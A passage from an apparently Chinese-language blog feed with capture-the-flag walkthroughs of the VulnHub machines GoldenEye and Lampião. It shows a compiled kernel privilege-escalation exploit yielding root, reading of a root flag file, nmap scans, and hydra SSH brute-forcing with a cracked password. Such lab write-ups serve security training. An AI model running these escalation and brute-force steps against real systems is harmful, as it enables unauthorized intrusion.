class="line">www-data@01:/tmp$</span><br></pre></td></tr></table></figure><p>报错显示没有输入文件,所以有</p><p>修改exp,gcc修改为cc</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661486633-8f78136f580c7fda09faf40657a2e72c.webp" alt="image-20220826120348707"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">www-data@01:/tmp$ cc 1.c -o exp</span><br><span class="line">cc 1.c -o exp</span><br><span class="line">1.c:62:1: warning: control may reach end of non-void <span class="keyword">function</span> [-Wreturn-<span class="built_in">type</span>]</span><br><span class="line">&#125;</span><br><span class="line">^</span><br><span class="line">1.c:74:12: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;unshare&#x27;</span> is invalid <span class="keyword">in</span> C99 [-Wimplicit-function-declaration]</span><br><span class="line">        <span class="keyword">if</span>(unshare(CLONE_NEWUSER) != 0)</span><br><span class="line">           ^</span><br><span class="line">1.c:79:17: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;clone&#x27;</span> is invalid <span class="keyword">in</span> C99 [-Wimplicit-function-declaration]</span><br><span class="line">                <span class="built_in">clone</span>(child_exec, child_stack + (1024*1024), clone_flags, NULL);</span><br><span class="line">                ^</span><br><span class="line">1.c:85:13: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;waitpid&#x27;</span> is invalid <span class="keyword">in</span> C99 [-Wimplicit-function-declaration]</span><br><span class="line">            waitpid(pid, &amp;status, 0);</span><br><span class="line">            ^</span><br><span class="line">1.c:95:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;wait&#x27;</span> is invalid <span class="keyword">in</span> C99 [-Wimplicit-function-declaration]</span><br><span class="line">    <span class="built_in">wait</span>(NULL);</span><br><span class="line">    ^</span><br><span class="line">5 warnings generated.</span><br><span class="line">www-data@01:/tmp$ ./exp</span><br><span class="line">./exp</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),33(www-data)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>提权成功</p><p>接着查找flag了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># find / -name &quot;*flag*&quot;</span></span><br><span class="line">find / -name <span class="string">&quot;*flag*&quot;</span></span><br><span class="line">/usr/lib/llvm-3.4/build/autoconf/m4/cxx_flag_check.m4</span><br><span class="line">/usr/lib/perl/5.18.2/bits/waitflags.ph</span><br><span class="line">/usr/share/help-langpack/en_GB/evolution/mail-follow-up-flag.page</span><br><span class="line">/usr/share/help-langpack/en_GB/gnome-mines/flags.page</span><br><span class="line">/usr/share/man/man3/fesetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man3/fegetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man1/doveadm-flags.1.gz</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/scripts/coccinelle/locks/flags.cocci</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/c6x/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/frv/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/parisc/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/score/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/s390/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/um/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/unicore32/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/x86/kernel/cpu/mkcapflags.sh</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/x86/include/asm/processor-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/x86/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/x86/include/uapi/asm/processor-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/mn10300/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/openrisc/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/hexagon/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/alpha/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/sh/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/metag/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/m32r/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/arm64/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/powerpc/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/arm/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/microblaze/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/xtensa/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/tile/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/sparc/include/asm/irqflags_32.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/sparc/include/asm/irqflags_64.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/sparc/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/ia64/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/arc/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/mips/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/avr32/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/cris/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/cris/include/arch-v32/arch/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/cris/include/arch-v10/arch/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/m68k/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/arch/blackfin/include/asm/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/uapi/linux/kernel-page-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/uapi/linux/tty_flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/linux/page-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/linux/pageblock-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/linux/kernel-page-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/linux/page-flags-layout.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/linux/page-debug-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/linux/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/trace/events/gfpflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32/include/asm-generic/irqflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/config/arch/hweight/cflags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/config/pageflags</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/config/zone/dma/flag.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/config/trace/irqflags</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/linux/page-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/linux/pageblock-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/linux/kernel-page-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/linux/page-flags-layout.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/linux/page-debug-flags.h</span><br><span class="line">/usr/src/linux-headers-3.13.0-32-generic/include/linux/irqflags.h</span><br><span class="line">/usr/include/x86_64-linux-gnu/asm/processor-flags.h</span><br><span class="line">/usr/include/x86_64-linux-gnu/bits/waitflags.h</span><br><span class="line">/usr/include/linux/kernel-page-flags.h</span><br><span class="line">/usr/include/linux/tty_flags.h</span><br><span class="line">/proc/kpageflags</span><br><span class="line">/proc/sys/kernel/acpi_video_flags</span><br><span class="line">/var/www/html/006-final/x8vtfinal-flag.gif</span><br><span class="line">/var/www/html/006-final/xvf7-flag</span><br><span class="line">/var/www/html/gnocertdir/pix/i/unflagged.png</span><br><span class="line">/var/www/html/gnocertdir/pix/i/flagged.png</span><br><span class="line">/var/www/html/gnocertdir/question/flags.js</span><br><span class="line">/var/www/html/gnocertdir/question/toggleflag.php</span><br><span class="line">/var/www/html/gnocertdir/theme/afterburner/pix_core/i/unflagged.png</span><br><span class="line">/var/www/html/gnocertdir/theme/afterburner/pix_core/i/flagged.png</span><br><span class="line">/var/www/html/gnocertdir/theme/mymobile/pix_core/i/unflagged.png</span><br><span class="line">/var/www/html/gnocertdir/theme/mymobile/pix_core/i/flagged.png</span><br><span class="line">/var/www/html/gnocertdir/mod/quiz/pix/navflagged.png</span><br><span class="line">/root/.flag.txt</span><br><span class="line">/sys/devices/pci0000:00/0000:00:11.0/0000:02:01.0/net/eth0/flags</span><br><span class="line">/sys/devices/system/cpu/cpu0/microcode/processor_flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS4/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS5/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS6/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS7/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS8/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS9/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS10/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS11/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS12/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS13/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS14/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS15/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS16/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS17/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS18/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS19/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS20/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS21/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS22/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS23/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS24/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS25/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS26/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS27/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS28/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS29/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS30/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS31/flags</span><br><span class="line">/sys/kernel/debug/tracing/events/power/pm_qos_update_flags</span><br><span class="line">/sys/module/scsi_mod/parameters/default_dev_flags</span><br></pre></td></tr></table></figure><p>发现有个flag.txt文件</p><p>cat 这个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat .flag.txt</span></span><br><span class="line"><span class="built_in">cat</span> .flag.txt</span><br><span class="line">Alec told me to place the codes here:</span><br><span class="line"></span><br><span class="line">568628e0d993b1973adc718237da6e93</span><br><span class="line"></span><br><span class="line">If you captured this make sure to go here.....</span><br><span class="line">/006-final/xvf7-flag/</span><br></pre></td></tr></table></figure><p>访问/006-final/xvf7-flag/</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661486915-9f03895b7c8fdbdf623cb6f13c34754e.webp" alt="image-20220826120826659"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;项目Goldeneye&quot;&gt;项目Goldeneye&lt;/h2&gt;
&lt;figure class=&quot;highlight txt&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span </summary>
      
    
    
    
    <category term="百项目" scheme="https://www.dansemal.cn/categories/%E7%99%BE%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="百项目" scheme="https://www.dansemal.cn/tags/%E7%99%BE%E9%A1%B9%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>002-Lampiao</title>
    <link href="https://www.dansemal.cn/posts/e5d9e109/"/>
    <id>https://www.dansemal.cn/posts/e5d9e109/</id>
    <published>2022-08-14T07:21:00.000Z</published>
    <updated>2022-08-14T06:19:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="项目Lampiao">项目Lampiao</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">项目地址:https://www.vulnhub.com/entry/lampiao-1,249/</span><br><span class="line"></span><br><span class="line">Name: Lampião: 1</span><br><span class="line">Date release: 28 Jul 2018</span><br><span class="line">Author: Tiago Tavares</span><br><span class="line">Series: Lampião</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">Would you like to keep hacking in your own lab?</span><br><span class="line"></span><br><span class="line">Try this brand new vulnerable machine! &quot;Lampião 1&quot;.</span><br><span class="line"></span><br><span class="line">Get root!</span><br><span class="line"></span><br><span class="line">Level: Easy</span><br></pre></td></tr></table></figure><h2 id="信息搜集">信息搜集</h2><h3 id="获取项目地址">获取项目地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 10.0.0.0/24</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/002]</span><br><span class="line">└─<span class="comment"># nmap -sP 10.0.0.0/24</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-26 13:54 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> openwrt.lan (10.0.0.1)</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line">MAC Address: 00:15:5D:80:01:00 (Microsoft)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> PC-A.lan (10.0.0.2)</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">MAC Address: 00:15:5D:64:C0:00 (Microsoft)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 02.lan (10.0.0.102)</span><br><span class="line">Host is up (0.00063s latency).</span><br><span class="line">MAC Address: 00:0C:29:D0:3D:FF (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> kali.lan (10.0.0.3)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.03 seconds</span><br></pre></td></tr></table></figure><p>确定项目ip为 <mark class="hl-label default">10.0.0.102</mark> </p><h3 id="扫描项目端口">扫描项目端口</h3><p><code>namp -p- 10.0.0.102</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/002]</span><br><span class="line">└─<span class="comment"># nmap -p- 10.0.0.102</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-26 13:56 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 02.lan (10.0.0.102)</span><br><span class="line">Host is up (0.0025s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">1898/tcp open  cymtec-port</span><br><span class="line">MAC Address: 00:0C:29:D0:3D:FF (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.94 seconds</span><br></pre></td></tr></table></figure><h3 id="访问80-1898-端口">访问80,1898 端口</h3><p>80端口只是txt文件</p><h4 id="访问1898发现">访问1898发现</h4><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661496308-4b3f3c4bd7b6ccb91ff09b7601571e16.webp" alt="image-20220826144503022"></p><p>查看页脚 发现此站点为drupal cms</p><p>点进文章 显示url为<a href="http://10.0.0.102:1898/?q=node/1">http://10.0.0.102:1898/?q=node/1</a></p><mark class="hl-label default">?q=node/1</mark> <h4 id="修改为2-显示新页面">修改为2 显示新页面</h4><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661497170-731b1c977bb27dff2e48e8eddb1a6a03.webp" alt="image-20220826145927069"></p><p>发现 文章内容有 文件名</p><p>尝试访问</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661497251-c49f00af1dcd71f0d1b2e58e3e1e3cbf.webp" alt="image-20220826150047806"></p><p>下载下来 从音频中能听见 为 <mark class="hl-label tiago">user</mark> </p><p>因此确认有 用户为tiago</p><p>接着访问qre.png ,发现为二维码</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661497435-cf8158e47c373f0ec3097d1eb2c55c9f.webp" alt="image-20220826150351568"></p><h4 id="修改为3-显示新页面">修改为3 显示新页面</h4><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661497480-12679b39cfbacbc44b0562db4ff59b6e.webp" alt="image-20220826150437035"></p><p>发现为一首歌曲(或许可能为葡萄牙歌曲?不懂hhh)</p><h3 id="爆破ssh端口">爆破ssh端口</h3><h4 id="生成字典文件">生成字典文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://10.0.0.102:1898/ -w passwd.txt</span><br></pre></td></tr></table></figure><h4 id="hydra-爆破ssh端口">hydra 爆破ssh端口</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/002]</span><br><span class="line">└─<span class="comment"># hydra -l tiago -P passwd.txt -o success.txt 10.0.0.102 -s 22 ssh</span></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-02 15:11:42</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 844 login tries (l:1/p:844), ~53 tries per task</span><br><span class="line">[DATA] attacking ssh://10.0.0.102:22/</span><br><span class="line">[22][ssh] host: 10.0.0.102   login: tiago   password: Virgulino</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 2 final worker threads did not complete <span class="keyword">until</span> end.</span><br><span class="line">[ERROR] 2 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 target did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-02 15:12:35</span><br></pre></td></tr></table></figure><p>得知</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tiago:Virgulino</span><br></pre></td></tr></table></figure><h3 id="目录扫描">目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/002]</span><br><span class="line">└─<span class="comment"># dirb http://10.0.0.102:1898/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Fri Sep  2 15:19:01 2022</span><br><span class="line">URL_BASE: http://10.0.0.102:1898/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.0.0.102:1898/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.0.0.102:1898/includes/</span><br><span class="line">+ http://10.0.0.102:1898/index.php (CODE:200|SIZE:11354)</span><br><span class="line">==&gt; DIRECTORY: http://10.0.0.102:1898/misc/</span><br><span class="line">==&gt; DIRECTORY: http://10.0.0.102:1898/modules/</span><br><span class="line">==&gt; DIRECTORY: http://10.0.0.102:1898/profiles/</span><br><span class="line">+ http://10.0.0.102:1898/robots.txt (CODE:200|SIZE:2189)</span><br><span class="line">==&gt; DIRECTORY: http://10.0.0.102:1898/scripts/</span><br><span class="line">+ http://10.0.0.102:1898/server-status (CODE:403|SIZE:292)</span><br><span class="line">==&gt; DIRECTORY: http://10.0.0.102:1898/sites/</span><br><span class="line">==&gt; DIRECTORY: http://10.0.0.102:1898/themes/</span><br><span class="line">+ http://10.0.0.102:1898/web.config (CODE:200|SIZE:2200)</span><br><span class="line">+ http://10.0.0.102:1898/xmlrpc.php (CODE:200|SIZE:42)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://10.0.0.102:1898/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://10.0.0.102:1898/misc/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://10.0.0.102:1898/modules/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://10.0.0.102:1898/profiles/ ----</span><br><span class="line">(!) 